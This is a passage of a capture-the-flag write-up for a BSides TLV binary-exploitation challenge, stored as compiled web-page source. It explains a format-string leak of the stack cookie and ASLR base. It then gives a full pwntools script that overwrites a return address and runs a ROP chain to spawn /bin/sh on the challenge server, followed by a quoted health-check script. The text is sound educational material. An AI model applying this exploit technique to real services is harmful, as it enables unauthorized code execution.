just rop, right? Well yes, but actually no,\nbut actually actually yes.`}),`\n`,(0,n.jsx)(e.p,{children:`The author made all the strings ascii-only, so we would have had to wait\nfor the stack cookie and the aslr base to be ascii-only for an exploit,\nwhich seemed unrealistic, so I scrapped that idea (Which was the intended\nsolution btw...), then I noticed that the decrypted buffer is copied from\nthe heap onto the stack (for some reason) before it's being processed.\nWhich means we have all the binary values of the current packet on the stack,\nor if we haven't overwritten them the previous ones.`}),`\n`,(0,n.jsxs)(e.p,{children:[`Which means instead of looking at the current stack frame we look a bit further\nup in the stack frame of main and voil\\xE0, we find the values we are looking for,\nluckily pwntools not only has the function `,(0,n.jsx)(e.code,{children:\"fmtstr_payload\"}),`, but also\n`,(0,n.jsx)(e.code,{children:\"fmtstr_split\"}),\", which returns the format string and the binary data required.\"]}),`\n`,(0,n.jsx)(e.p,{children:`So after leaking the values, we can continue to create a ropchain (pwntools\nactually worked here, so just do a call to execve, don't forget to set the base\nstack address).\nNext we somehow want the thing to jump to our payload, so we make a formatstring\npayload which uses the binary data in the packet and overwrites the return address\nwith a ropgadget to increase the stack pointer (So it ends up in our buffer)`}),`\n`,(0,n.jsx)(e.p,{children:`Next we just add the format, then get the string (which executes the vulnerability),\nwith optional data being set to the formatstring payload and the ropchain.`}),`\n`,(0,n.jsx)(e.p,{children:`There are some magic values, but they're not really that magic, the base\nstack address is just calculated, since we have two returns and the gadget\nincreases the stack address by 0x78, we have a total of 0x88 bytes,\nthe 0x14fd22 is the offset to that gadget, the 553 is the offset into the\nbuffer in the stack frame of main (which can be calculated using the stack\nframe sizes of all functions up to main and the return addresses, or by\nguessing and adjusting)`}),`\n`,(0,n.jsx)(e.p,{children:`The final payload has some space in between the format string data and\nthe ropchain, which i just filled with a bunch of 0s.`}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"LOCAL\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"GDB\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" gdb\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"debug\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./main\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"aslr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" process\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./main\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" remote\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"intergalactic-communicator.ctf.bsidestlv.com\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8080\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" Comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./main\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\"%529$p %533$p %532$p\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"leaks \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack_cookie \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"leaks\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\" \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"leaks\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\" \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1C27E\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack_address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"leaks\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\" \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"info\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Stack cookie: 0x%x, ASLR base: 0x%x, Stack addr: 0x%x\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" stack_cookie\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" stack_address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ROP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"base\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"stack_address\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x88\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:'#rop.raw(rop.find_gadget([\"ret\"]).address)'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'execve'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"b'/bin/sh'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"sh\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"start_addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" stack_address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"ropchain \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"clear\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"fmt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" fmtstr_split\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"553\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    start_addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x14fd22\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" numbwritten\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fmt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'b\"0\"'}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x50\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"ropchain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendline\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'b\"ls\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"links\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#links\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Links\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"[\",(0,n.jsx)(e.a,{href:\"https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9%5D(Redis\",children:\"https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9](Redis\"}),\" crc64)\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.h2,{id:\"healthcheck\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#healthcheck\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Healthcheck\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Found this on the remote called \",(0,n.jsx)(e.code,{children:\"health_check.py\"})]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` socket\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` sys\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` re\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"server \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'localhost'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"port \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8080\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"check \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00\\\\x00\\\\x0c\\\\xa9\\\\xff\\\\xaf\\\\xc0\\\\xbc\\\\x1b\\\\xacW5\\\\xc9A\\\\x11'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'b\"\\\\x00\\\\x00\\\\x00\u003e\\\\\\\\E\\\\xc5h\\\\x06\\\\xc4\\\\xd3c\\\\xb4Ng\\\\x04-\\\\x10\\\\xa1\\\\x05fJ\\\\xfb]\\\\xbff*Ww46\\\\xe1\\\\xfb2\\\\x80k\\\\xd43\\\\t)\\\\xd7`\\\\xc4\\\\x91\\\\xec\\\\x9e\\\\xef\\\\xb2rC\\\\x12J\\\\xcb\\\\x83\\\\x1a2o\\\\xfc\\\\xb3\\\\x0f\\\\x190\\\\xaf\\\\x9a\\\\xaf\\'\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"read \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00\\\\x00\\\\x10\\\\x88\\\\x88\\\\xde\\\\x92+\\\\x00:pu\\\\x92\\\\xe5\\\\xb8\\\\xd6\\\\xd0w\\\\xf7'\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"send_exploit\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"buffer\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"bytes\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" read_response\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" health\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"buffer\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" read_response\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        size \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"from_bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'little'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        resp \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" health\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'Welcome to the Intergalactic Communicator'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                sock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'canary:'\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"match\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" re\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"findall\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"rb'shellcode:([0-9A-Fa-fXx]*?):base:([0-9A-Fa-fXx]*?):canary:([0-9A-Fa-fXx]*?):'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"get_connection\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ip\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" socket\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"socket\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    sock \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"None\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" sock \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"is\"}),\" \",(0,n.jsx)(e.span,{className:\"token 